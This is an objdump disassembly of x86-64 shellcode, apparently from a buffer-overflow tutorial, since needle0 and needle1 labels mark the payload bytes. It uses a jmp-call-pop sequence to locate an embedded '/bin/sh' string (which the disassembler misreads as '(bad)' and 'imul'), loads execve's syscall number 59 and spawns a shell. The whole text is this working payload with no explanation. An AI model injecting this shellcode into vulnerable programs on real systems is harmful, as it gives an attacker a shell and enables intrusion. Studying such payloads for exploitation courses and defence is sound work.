00000000004004f1 <needle0>:
  4004f1:	eb 0e                	jmp    400501 <there>

00000000004004f3 <here>:
  4004f3:	5f                   	pop    %rdi
  4004f4:	48 31 c0             	xor    %rax,%rax
  4004f7:	b0 3b                	mov    $0x3b,%al
  4004f9:	48 31 f6             	xor    %rsi,%rsi
  4004fc:	48 31 d2             	xor    %rdx,%rdx
  4004ff:	0f 05                	syscall 

0000000000400501 <there>:
  400501:	e8 ed ff ff ff       	callq  4004f3 <here>
  400506:	2f                   	(bad)  
  400507:	62                   	(bad)  
  400508:	69 6e 2f 73 68 00 ef 	imul   $0xef006873,0x2f(%rsi),%ebp

000000000040050e <needle1>:

